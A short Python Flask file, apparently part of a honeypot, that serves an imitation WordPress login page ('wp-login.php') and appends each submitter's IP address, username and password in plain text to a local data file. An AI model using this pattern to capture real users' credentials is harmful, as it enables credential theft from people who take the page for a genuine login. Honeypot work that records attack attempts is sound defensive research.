from flask import Flask # imports the flask module to use in this app
from flask import render_template
import os, sys

dir = os.path.split(os.path.abspath(os.path.realpath(sys.argv[0])))[0]

def logPostRequest(ip, form):
    # up = <ip> <username> <password>
    up = ('%s [%s] [%s]\n' % (ip, form['log'], form['pwd'],))
    if not os.path.exists(dir + '/data/word_press'):
        os.makedirs(dir + '/data/word_press')
    with open(dir + '/data/word_press/args.dat', 'a') as f:
        f.write(up)

def wordPressLoginHandler(request):
    if bool(request.form):
        logPostRequest(request.remote_addr, request.form)
    return render_template('wp-login.php')
